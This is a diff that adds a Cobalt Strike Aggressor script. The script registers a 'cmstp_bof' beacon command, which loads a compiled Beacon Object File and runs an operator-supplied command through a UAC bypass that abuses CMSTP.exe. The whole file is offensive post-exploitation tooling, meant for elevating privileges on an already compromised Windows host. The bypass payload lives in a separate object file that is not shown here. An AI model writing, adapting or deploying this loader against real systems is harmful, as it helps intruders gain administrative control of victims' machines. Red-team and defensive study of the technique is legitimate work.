@@ -1,0 +1,31 @@
+# cmstp.cna - CMSTP UAC Bypass BOF loader
+
+beacon_command_register(
+    "cmstp_bof", 
+    "UAC Bypass Using CMSTP.exe",
+    "Usage: cmstp_bof <command>"
+);
+
+alias cmstp_bof {
+    local('$handle $data $args');
+    
+    if ($2 eq "") {
+        berror($1, "Please specify a command to execute");
+        return;
+    }
+    
+    $handle = openf(script_resource("cmstp.x64.o"));
+    if ($handle is $null) {
+        berror($1, "Could not read BOF file");
+        return;
+    }
+    
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    btask($1, "Running cmstp_bof with command: $2");
+    
+    # Pack as zero-terminated string
+    $args = bof_pack($1, "z", $2);
+    beacon_inline_execute($1, $data, "go", $args);
+}
